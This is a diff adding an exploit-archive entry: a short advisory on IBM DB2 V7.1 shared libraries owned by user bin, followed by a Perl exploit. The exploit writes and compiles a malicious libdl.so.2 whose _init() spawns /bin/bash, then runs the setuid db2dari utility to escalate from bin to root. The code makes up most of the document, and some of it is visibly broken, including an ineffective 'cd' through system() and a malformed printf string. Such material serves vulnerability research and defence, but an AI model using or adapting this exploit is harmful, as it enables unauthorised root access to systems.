@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/8346/info
+
+IBM DB2 ships with a number of shared libraries, stored in a directory owned by the user and group 'bin'. As setuid root utilities are linked to these libraries, their ownership by a user and group of a lower privilege level constitutes a vulnerability. If an attacker can obtain user or group bin privileges, the shared libraries can be overwritten with malicious replacements designed to obtain root privileges from the setuid root utilities that use them.
+
+#!/usr/bin/perl
+
+#IBM DB2 local root from uid=bin 
+#deadbeat,
+#e:	daniels@legend.co.uk
+#e:	deadbeat@sdf.lonestar.org
+
+print "\nIBM db2 local bin escape to root sploit\n";
+print "Preparing exploit...\n";
+
+system("cd /usr/IBMdb2/V7.1/lib");
+open FILEHANDLE, (">foo.c")or die "Cant open foo for writing..:(\n";
+print FILEHANDLE "#include <stdio.h>\n";
+print FILEHANDLE "#include <string.h>\n\n";
+print FILEHANDLE "_init() {\n";
+print FILEHANDLE "\tprintf(\"init..()\\n\");\n";
+print FILEHANDLE "\tprintf(here we go: PID=\%i EUID=\%i\", getpid(), getuid());\n";
+print FILEHANDLE "\tsystem(\"/bin/bash\");\n";
+print FILEHANDLE "\tprintf(\"wicked done and dusted..\\n\")\n";
+print FILEHANDLE "}";
+close FILEHANDLE;
+system("gcc -fpic -shared -o libdl.so.2 foo.c");
+exec("db2dari")
+
+
